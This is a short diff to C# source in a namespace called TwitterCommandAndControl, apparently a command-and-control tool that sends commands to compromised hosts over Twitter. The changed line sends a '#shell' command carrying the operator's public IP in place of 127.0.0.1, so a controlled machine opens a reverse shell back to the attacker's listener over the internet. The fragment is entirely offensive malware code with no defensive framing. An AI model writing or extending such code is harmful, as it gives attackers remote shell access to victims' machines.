@@ -132,7 +132,7 @@ namespace TwitterCommandAndControl
                 client = listener.AcceptTcpClient();
                 listener.Stop();
             });
-            Messenger.Send(commandPrefix + " #shell #ip=127.0.0.1");
+            Messenger.Send(commandPrefix + " #shell #ip=" + GetPublicIP.GetIP());
             listenerTask.Wait();
             return client;
         }
